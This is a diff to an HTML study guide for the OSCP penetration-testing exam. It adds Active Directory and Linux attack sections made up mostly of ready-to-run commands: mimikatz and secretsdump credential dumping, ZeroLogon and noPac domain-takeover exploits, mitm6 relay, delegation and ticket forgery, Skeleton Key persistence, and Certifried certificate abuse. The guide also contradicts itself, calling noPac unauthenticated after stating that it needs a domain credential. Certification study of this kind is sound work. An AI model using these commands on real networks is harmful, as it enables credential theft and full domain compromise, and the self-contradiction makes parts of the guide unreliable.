@@ -1147,6 +1147,8 @@
     <p><strong>OSCP is a 24-hour hands-on hacking exam, not a multiple-choice test.</strong> You get 6 machines: 3 standalone boxes + 1 Active Directory set of 3 machines. You must hack into them and prove it by capturing flag files (<code>local.txt</code> and <code>proof.txt</code>).</p>
     <p><strong>You need 70 / 100 points to pass.</strong> After the 24-hour hacking window, you get a second 24 hours to write a professional report documenting exactly how you broke in. <em>No report = automatic fail, even with 100 points.</em></p>
     <p><strong>Strategy that passes:</strong> do the AD set first (40 guaranteed points if you follow the chain), then pick off standalones. The point breakdown below shows exactly where every point comes from.</p>
+    <p><strong>No bonus points anymore.</strong> The old "10 bonus points for 80% lab completion" scheme ended with the Nov 2024 OSCP+ format change — 70/100 must be earned live on exam day, full stop.</p>
+    <p><strong>OSCP vs OSCP+:</strong> passing today awards you both — <strong>OSCP</strong> (lifetime credential, the name recruiters recognise) and <strong>OSCP+</strong> (same cert, but expires after 3 years unless renewed via CPEs, a recert exam, or another qualifying OffSec cert). Keep this in mind for long-term career planning — don't let it lapse quietly.</p>
   </div>
 
   <h3>Point Breakdown</h3>
@@ -1564,7 +1566,13 @@ id | grep docker
 docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 
 # ── Internal services ────────────────────────────────────────
-ss -tlnp   # local-only → port forward → exploit</code></pre>
+ss -tlnp   # local-only → port forward → exploit
+
+# ── glibc / Looney Tunables (CVE-2023-4911) ──────────────────
+# Common on newer Ubuntu 22.04/23.x, Debian 12, Fedora — check version:
+ldd --version   # glibc 2.34–2.39 vulnerable
+# If vulnerable, download exploit-nation's PoC and run:
+python3 exploit.py</code></pre>
 
   <h3>Linux PrivEsc Decision Tree</h3>
   <div class="tree-box"><span class="root">sudo -l</span> → NOPASSWD?
@@ -1588,6 +1596,9 @@ ss -tlnp   # local-only → port forward → exploit</code></pre>
 
 <span class="root">Docker group?</span>
     └── docker run -v /:/mnt → chroot → <span class="win">ROOT ✓</span>
+
+<span class="root">glibc 2.34–2.39 (Looney Tunables)?</span>
+    └── CVE-2023-4911 PoC → <span class="win">ROOT ✓</span>
 
 <span class="note">Nothing? → Kernel exploit (check exact version)</span></div>
 
@@ -1742,6 +1753,84 @@ nxc smb &lt;TARGET_IP&gt; -u user -p pass -M lsassy</code></pre>
     <p><strong>The one insight that makes AD click:</strong> it's a <em>chain</em>, not three separate boxes. The credentials and hashes you loot on one machine are the keys to the next. Every phase is the same rhythm — enumerate → find a quick win → get a foothold → loot creds → reuse them to move forward → finally reach Domain Admin and own the DC.</p>
   </div>
 
+  <h3>Post-Exploitation on MS01 — Local PrivEsc → Loot → Bridge to MS02</h3>
+  <div class="callout red">
+    <strong>⚠ This is the step most students skip.</strong> Getting a low-priv shell on MS01 isn't the goal — it's the <em>starting point</em>. You need to escalate locally on MS01 first, then loot it properly, because the credentials/tickets that unlock MS02 are usually sitting on MS01, not found through more AD enumeration. Same mental model applies whether MS01 is domain-joined Windows, domain-joined Linux, or a standalone box in a multi-machine chain.
+  </div>
+
+  <div class="callout learn">
+    <span class="learn-tag">Why local privesc first</span>
+    <p><strong>A low-priv domain user's shell on MS01 usually can't read LSASS, LSA secrets, or other users' saved creds — you need local admin/SYSTEM on MS01 itself first.</strong> Run the exact same "Standalone Windows PrivEsc" checklist from Section 4 (SeImpersonate → Potato, service misconfigs, unattend.xml, etc.) — being domain-joined changes nothing about <em>how</em> you escalate locally, it only changes what you go looking for <em>once you're admin</em>.</p>
+  </div>
+
+  <pre data-lang="bash"><code># ── Windows MS01, once you have local admin/SYSTEM ──────────
+
+# 1. LSASS — catches ANY domain user who's ever logged in interactively
+#    (RDP'd admins, service techs) — often your highest-value loot:
+mimikatz # privilege::debug
+mimikatz # sekurlsa::logonpasswords
+# Remote/no-mimikatz version:
+nxc smb 192.168.x.101 -u localadmin -p 'Password123' -M lsassy
+secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+
+# 2. LSA secrets — service account & scheduled-task passwords stored in plaintext-reversible form:
+mimikatz # lsadump::secrets
+
+# 3. Cached domain creds (mscache v2) — useful if this box was ever offline from the DC:
+mimikatz # lsadump::cache
+# Crack offline: hashcat -m 2100 mscache.txt rockyou.txt
+
+# 4. DPAPI-protected secrets — saved browser/RDP/WiFi passwords:
+mimikatz # sekurlsa::dpapi
+mimikatz # dpapi::cred /in:"C:\Users\victim\AppData\...\Credentials\<blob>" /masterkey:<key>
+
+# 5. Search the filesystem for creds admins forget about:
+dir /s *unattend.xml *sysprep.inf *sysprep.xml 2&gt;nul
+dir /s *.rdg *.kdbx 2&gt;nul                          # RDCMan / KeePass files
+type C:\inetpub\wwwroot\web.config 2&gt;nul | findstr /i "password connectionstring"
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s   # saved PuTTY sessions
+findstr /si password *.txt *.ini *.config *.xml 2&gt;nul
+
+# 6. Services/scheduled tasks running AS a domain account (their creds are often in Group Managed / stored):
+sc.exe qc &lt;servicename&gt;                            # look for "SERVICE_START_NAME"
+schtasks /query /fo LIST /v | findstr /i "task to run\|run as user"
+
+# 7. Kerberos tickets already cached in memory — if a DA logged into MS01 recently, their TGT may still be here:
+klist
+Rubeus.exe triage
+Rubeus.exe dump /nowrap</code></pre>
+
+  <div class="callout learn">
+    <span class="learn-tag">Linux MS01, domain-joined (realm/SSSD) or just credential-reuse-prone</span>
+    <p>Linux boxes joined to AD (via <code>realmd</code>/<code>sssd</code>, or just running scheduled jobs with domain creds) leave Kerberos material on disk the same way LSASS holds it on Windows — the trick is knowing where to look.</p>
+  </div>
+  <pre data-lang="bash"><code># Keytabs — service account creds stored in plaintext-extractable form:
+find / -name "*.keytab" 2&gt;/dev/null
+klist -k -t /etc/krb5.keytab                       # list principals in a keytab
+python3 keytabextract.py /etc/krb5.keytab           # → NTLM hash, crackable
+
+# Cached Kerberos tickets (ccache) — reusable AS-IS, no cracking needed:
+find / -name "krb5cc_*" -o -name "*.ccache" 2&gt;/dev/null
+env | grep KRB5CCNAME
+klist                                                # if a ticket is loaded
+export KRB5CCNAME=/tmp/krb5cc_1000
+psexec.py -k -no-pass corp.local/user@&lt;target&gt;      # reuse it elsewhere
+
+# Config files with embedded domain/LDAP bind creds:
+cat /etc/sssd/sssd.conf 2&gt;/dev/null | grep -i "ldap_default\|password"
+find / -name "*.conf" -o -name "*.cnf" 2&gt;/dev/null | xargs grep -li "password" 2&gt;/dev/null
+
+# SSH keys / known_hosts reused across the domain's Linux fleet:
+find / -name "id_rsa" -o -name "id_ed25519" 2&gt;/dev/null
+cat ~/.ssh/known_hosts 2&gt;/dev/null    # tells you what else this box talks to</code></pre>
+
+  <div class="tree-box"><span class="root">Local admin/root on MS01 achieved</span> → before touching MS02, in order:
+    ├── <span class="leaf">Dump LSASS / LSA secrets / mscache (Windows) or hunt keytabs+ccache (Linux)</span>
+    ├── <span class="leaf">Check who's logged in / recently logged in — <code>quser</code>, <code>net session</code>, <code>.rdp</code>/<code>.rdg</code> files</span>
+    ├── <span class="leaf">Grep configs/history for plaintext creds (web.config, PS history, bash_history)</span>
+    ├── <span class="leaf">Re-run BloodHound with any NEW creds found — new user = new attack paths</span>
+    └── <span class="win">Now pivot to MS02 with whatever you looted (hash → PtH, ticket → PtT, plaintext → direct login)</span></div>
+
   <h3>Phase 1: AD Enumeration</h3>
 
   <div class="callout learn">
@@ -1895,6 +1984,40 @@ kerbrute userenum -d corp.local --dc 192.168.x.100 \
 GetNPUsers.py corp.local/ -no-pass -usersfile domain_users.txt \
     -dc-ip 192.168.x.100 -format hashcat
 hashcat -m 18200 asrep.txt rockyou.txt</code></pre>
+
+  <h3>ZeroLogon — Unauthenticated Domain Admin (CVE-2020-1472)</h3>
+  <div class="callout learn">
+    <span class="learn-tag">When to try this</span>
+    <p>Works if the DC's Netlogon channel is unpatched. <strong>Zero creds needed</strong> — just the DC's IP and hostname. Check it early in AD enumeration, it's a 2-command win if it lands.</p>
+  </div>
+  <pre data-lang="bash"><code># 1. Check if vulnerable (safe, no changes made):
+nxc smb 192.168.x.100 -u '' -p '' -M zerologon
+# or:
+python3 zerologon_tester.py DC01 192.168.x.100
+
+# 2. Exploit — resets DC machine account password to empty (DISRUPTIVE, do this once):
+python3 cve-2020-1472-exploit.py DC01 192.168.x.100
+
+# 3. Dump hashes with the now-empty machine account password:
+secretsdump.py -just-dc -no-pass 'DC01$'@192.168.x.100
+
+# 4. IMPORTANT — restore the original password after (report requirement, avoid breaking the DC):
+python3 restorepassword.py corp.local/DC01\$@192.168.x.100 -target-ip 192.168.x.100 -hexpass &lt;original_hash_from_secretsdump&gt;</code></pre>
+
+  <h3>noPac / SamAccountName Spoofing — Low-Priv User to DA (CVE-2021-42278 + CVE-2021-42287)</h3>
+  <div class="callout learn">
+    <span class="learn-tag">When to try this</span>
+    <p>Needs <strong>one valid low-priv domain credential</strong> (any domain user). Abuses the ability to rename a machine account you control to look like a DC, then requests a ticket impersonating it. Very common shortcut to Domain Admin once you have any foothold cred.</p>
+  </div>
+  <pre data-lang="bash"><code># 1. Check if vulnerable:
+nxc smb 192.168.x.100 -u stephanie -p 'Password123' -M nopac
+
+# 2. Full automated chain (creates fake machine account, renames it, requests ST, dumps hashes):
+python3 noPac.py corp.local/stephanie:'Password123' -dc-ip 192.168.x.100 \
+    -dc-host DC01 --impersonate administrator -use-ldap dump
+
+# 3. Or manual: get a TGT as the fake DC, then:
+secretsdump.py -just-dc corp.local/administrator@192.168.x.100 -k -no-pass</code></pre>
 
   <h3>LDAP — Extended Field Enumeration</h3>
   <pre data-lang="bash"><code># Check description AND info AND comment fields (all can have passwords):
@@ -2065,6 +2188,108 @@ ticketer.py -nthash &lt;KRBTGT_NTLM_HASH&gt; \
     -domain corp.local Administrator
 export KRB5CCNAME=Administrator.ccache
 psexec.py -k -no-pass corp.local/Administrator@&lt;DC_FQDN&gt;</code></pre>
+
+  <h3>mitm6 — IPv6 DNS Takeover (Pre-Creds Initial Access)</h3>
+  <div class="callout learn">
+    <span class="learn-tag">What &amp; why</span>
+    <p><strong>Most networks run IPv6 but don't manage it.</strong> Windows machines prefer IPv6 by default and auto-request an address via DHCPv6. <code>mitm6</code> answers those requests, makes you the machine's IPv6 DNS server, then feeds it a fake WPAD proxy — every HTTP request (including Windows Update/telemetry checks) routes through you, capturing NTLM auth which you relay straight into LDAP. This is a genuine <strong>no-creds-needed</strong> path to a foothold if the AD set's box has any unauthenticated network access.</p>
+  </div>
+  <pre data-lang="bash"><code># Terminal 1 — start the IPv6 DNS takeover:
+mitm6 -d corp.local --ignore-nofqdn
+
+# Terminal 2 — relay captured auth into LDAP, escalate a user's rights:
+ntlmrelayx.py -6 -t ldaps://192.168.x.100 --delegate-access -wh fakewpad.corp.local
+
+# Result: relayed machine account gets RBCD rights → chain into a shell:
+getST.py -spn cifs/&lt;TARGET_FQDN&gt; corp.local/'FAKE-COMPUTER$':'' -impersonate Administrator -dc-ip 192.168.x.100</code></pre>
+
+  <h3>Delegation Attacks — Unconstrained / Constrained / RBCD</h3>
+  <div class="callout learn">
+    <span class="learn-tag">Mental model</span>
+    <p><strong>Delegation lets a service impersonate a user to reach a second service on their behalf</strong> (e.g. a web server needs to query a database as the logged-in user). Three flavours, worst-to-best for defenders: <strong>Unconstrained</strong> = the box can impersonate <em>anyone</em> who authenticates to it, including a Domain Admin, so you just have to coerce a DA/DC to connect. <strong>Constrained (S4U2Proxy)</strong> = restricted to specific target services, but if you own the delegating account you can impersonate anyone against those services. <strong>RBCD</strong> = the target itself decides who can delegate to it — if you have write access to that setting, you grant yourself delegation rights.</p>
+  </div>
+  <pre data-lang="bash"><code># ── Unconstrained: find it, then coerce a DC to auth to it ──
+Get-ADComputer -Filter {TrustedForDelegation -eq $true}
+# Coerce the DC (PrinterBug/PetitPotam) while monitoring for the TGT:
+python3 printerbug.py corp.local/stephanie:'Password123'@DC01 attacker-ip
+Rubeus.exe monitor /interval:5 /filteruser:DC01$
+# Use the captured TGT:
+Rubeus.exe ptt /ticket:&lt;base64_ticket&gt;
+
+# ── Constrained (S4U2Proxy) — you control an account with delegation set ──
+Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
+getST.py -spn cifs/target.corp.local -impersonate Administrator \
+    corp.local/svc_account:'Password123' -dc-ip 192.168.x.100
+
+# ── RBCD — you have GenericWrite/GenericAll on the target computer ──
+rbcd.py -delegate-to 'TARGET$' -delegate-from 'ATTACKPC$' -dc-ip 192.168.x.100 -action write corp.local/stephanie:'Password123'
+getST.py -spn cifs/target.corp.local corp.local/'ATTACKPC$':'Attack123!' -impersonate Administrator -dc-ip 192.168.x.100</code></pre>
+
+  <h3>Silver Ticket &amp; Diamond Ticket</h3>
+  <div class="callout learn">
+    <span class="learn-tag">Golden Ticket's quieter cousins</span>
+    <p><strong>Silver Ticket</strong> forges a service ticket using a <em>service account's</em> hash (not krbtgt) — narrower access (one service only) but never touches the DC, so it's stealthier. <strong>Diamond Ticket</strong> takes a <em>real</em> TGT and modifies its PAC in place rather than forging one from scratch, which evades detections that look for "ticket with no matching AS-REQ".</p>
+  </div>
+  <pre data-lang="bash"><code># Silver Ticket (needs the target service account's NTLM hash):
+ticketer.py -nthash &lt;SERVICE_ACCT_NTLM&gt; -domain-sid S-1-5-21-XXX-XXX-XXX \
+    -domain corp.local -spn cifs/target.corp.local Administrator
+export KRB5CCNAME=Administrator.ccache
+psexec.py -k -no-pass corp.local/Administrator@target.corp.local
+
+# Diamond Ticket (Rubeus, needs krbtgt hash + a real TGT to modify):
+Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 \
+    /groups:512 /krbkey:&lt;KRBTGT_AES256&gt; /domain:corp.local /dc:DC01.corp.local /ptt</code></pre>
+
+  <h3>Skeleton Key — Domain-Wide Master Password</h3>
+  <div class="callout learn">
+    <span class="learn-tag">What &amp; why</span>
+    <p>Once you have admin on a DC, Mimikatz can patch LSASS in memory to accept <strong>one extra master password for every account in the domain</strong> — without changing anyone's real password (so nothing looks broken). It doesn't survive a reboot, so it's a same-session persistence trick, not a report-worthy "found vulnerability" — mention it as a technique, don't rely on it for exam points.</p>
+  </div>
+  <pre data-lang="powershell"><code>mimikatz # privilege::debug
+mimikatz # misc::skeleton
+# Now ANY account authenticates with its real password OR "mimikatz":
+nxc smb 192.168.x.100 -u administrator -p mimikatz</code></pre>
+
+  <h3>LAPS &amp; gMSA — Stored Credential Extraction</h3>
+  <pre data-lang="bash"><code># ── LAPS: local admin passwords stored in AD, readable if you have rights ──
+Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | Where {$_."ms-Mcs-AdmPwd" -ne $null}
+# Or via nxc/crackmapexec-style tools:
+nxc ldap 192.168.x.100 -u stephanie -p 'Password123' -M laps
+
+# ── gMSA: service-account passwords, readable via msDS-ManagedPassword blob ──
+Get-ADServiceAccount -Filter * -Properties msDS-ManagedPassword
+# Decrypt with DSInternals (needs read rights on the gMSA object):
+Get-ADServiceAccount -Identity gmsa-svc -Properties 'msDS-ManagedPassword' | \
+    Select-Object -ExpandProperty 'msDS-ManagedPassword' | ConvertFrom-ADManagedPasswordBlob</code></pre>
+
+  <h3>DSRM Credentials &amp; SID History (Trust Attacks)</h3>
+  <pre data-lang="bash"><code># ── DSRM: local admin account baked into every DC, gives persistence ──
+reg save HKLM\SYSTEM system.save
+reg save HKLM\SAM sam.save
+mimikatz # lsadump::sam /system:system.save /sam:sam.save
+# Use the DSRM hash to auth (needs a registry tweak to allow network logon):
+nxc smb DC01 -u administrator -H &lt;DSRM_HASH&gt; --local-auth
+
+# ── SID History: forge membership in a trusted domain's privileged group ──
+Get-ADTrust -Filter *              # map trust direction first
+mimikatz # kerberos::golden /domain:child.corp.local /sid:S-1-5-21-CHILD \
+    /sids:S-1-5-21-PARENT-519 /rc4:&lt;krbtgt_hash&gt; /user:Administrator /ptt
+# The /sids: value is the parent domain's Enterprise Admins SID — grants cross-domain access</code></pre>
+
+  <h3>SCCM &amp; WSUS Lateral Movement</h3>
+  <div class="callout learn">
+    <span class="learn-tag">When you'll see these</span>
+    <p>Both are management infrastructure that pushes software/updates to every domain machine — if you can talk to either as a low-priv user, you can often push a "package" that's actually your reverse shell, landing as SYSTEM on any managed box.</p>
+  </div>
+  <pre data-lang="bash"><code># SCCM — check client namespace access, then look for policy/NAA creds:
+Get-WmiObject -Namespace "root\ccm\clientsdk" -Class CCM_Application
+nxc smb &lt;SCCM_server&gt; -u stephanie -p 'Password123' --shares
+# SharpSCCM / sccmhunter for full recon + NAA credential theft
+
+# WSUS — unsigned HTTP updates can be swapped for malicious ones:
+Get-WSUSServer   # confirm it's plain http:// not https://
+nxc smb &lt;WSUS_server&gt; -u stephanie -p 'Password123' --shares
+# WSUS-based MITM tools (e.g. pywsus/WSUSpect) inject a malicious "update"</code></pre>
 
   <a href="#top" class="back-top">↑ Back to top</a>
 </section>
@@ -2443,8 +2668,31 @@ script /dev/null -c bash
         <tr><td>CVE-2021-44228 Log4Shell</td><td>Log4j 2.x Java</td><td><span class="impact">→ RCE</span></td></tr>
         <tr><td>CVE-2021-1675 PrintNightmare</td><td>Win2019/10</td><td><span class="impact">→ SYSTEM/RCE</span></td></tr>
         <tr><td>CVE-2022-26134 Confluence</td><td>OGNL injection 7.4.17</td><td><span class="impact">→ RCE</span></td></tr>
+        <tr><td>CVE-2020-1472 ZeroLogon</td><td>Netlogon (unpatched DC)</td><td><span class="impact">→ Domain Admin (no creds)</span></td></tr>
+        <tr><td>CVE-2021-42278 + 42287 noPac</td><td>sAMAccountName spoofing (AD)</td><td><span class="impact">→ Domain Admin (low-priv user)</span></td></tr>
+        <tr><td>CVE-2023-4911 Looney Tunables</td><td>glibc ld.so (Ubuntu/Fedora/Debian)</td><td><span class="impact">→ local root</span></td></tr>
+        <tr><td>CVE-2023-38408 ssh-agent</td><td>OpenSSH &lt; 9.3p2 fwd agent</td><td><span class="impact">→ RCE</span></td></tr>
+        <tr><td>CVE-2021-34473/34523/31207 ProxyShell</td><td>Exchange Server</td><td><span class="impact">→ RCE/SYSTEM</span></td></tr>
+        <tr><td>CVE-2021-26855 ProxyLogon</td><td>Exchange Server</td><td><span class="impact">→ RCE (pre-auth)</span></td></tr>
+        <tr><td>CVE-2021-22205 GitLab ExifTool</td><td>GitLab CE/EE avatar upload</td><td><span class="impact">→ RCE</span></td></tr>
+        <tr><td>CVE-2023-22515 / 22518 Confluence</td><td>Broken access control</td><td><span class="impact">→ Admin account creation → RCE</span></td></tr>
+        <tr><td>CVE-2020-0796 SMBGhost</td><td>SMBv3 compression (Win10/Server19)</td><td><span class="impact">→ RCE/SYSTEM</span></td></tr>
+        <tr><td>CVE-2022-26923 Certifried</td><td>ADCS + machine account spoofing</td><td><span class="impact">→ Domain Admin</span></td></tr>
       </tbody>
     </table>
+  </div>
+
+  <div class="callout learn" style="margin-top:16px;">
+    <span class="learn-tag">Certifried — the noPac of ADCS</span>
+    <p>Same idea as noPac, different exploitation path: rename a machine account you control to match a DC's <code>dNSHostName</code>, request a certificate for it via ADCS (any template with client-auth works, even the default <em>Machine</em> template), then authenticate as the DC with that cert.</p>
+    <pre data-lang="bash"><code>certipy account update -u stephanie@corp.local -p 'Password123' -user 'ATTACKPC$' -dns DC01.corp.local
+certipy req -u 'ATTACKPC$@corp.local' -p 'Attack123!' -ca CORP-CA -template Machine -dc-ip 192.168.x.100
+certipy auth -pfx dc01.pfx -dc-ip 192.168.x.100</code></pre>
+  </div>
+
+  <div class="callout learn" style="margin-top:16px;">
+    <span class="learn-tag">2025-26 note</span>
+    <p><strong>ZeroLogon and noPac are the two most common "unauthenticated → Domain Admin" AD chains in current OSCP-style labs</strong> — always check these first if a DC looks unpatched (Netlogon secure channel reset for ZeroLogon; check <code>nxc smb &lt;DC-IP&gt; -u '' -p '' --gen-relay-list</code>-style anonymous SMB access as a first signal, then confirm with <code>nxc smb &lt;DC-IP&gt; -M zerologon</code>). <strong>Looney Tunables</strong> has replaced some older kernel-exploit boxes as the go-to Linux local-root on newer Ubuntu/Debian targets — check <code>/etc/os-release</code> + glibc version early in enumeration, not just as a last resort.</p>
   </div>
 
   <h3>SearchSploit Workflow</h3>
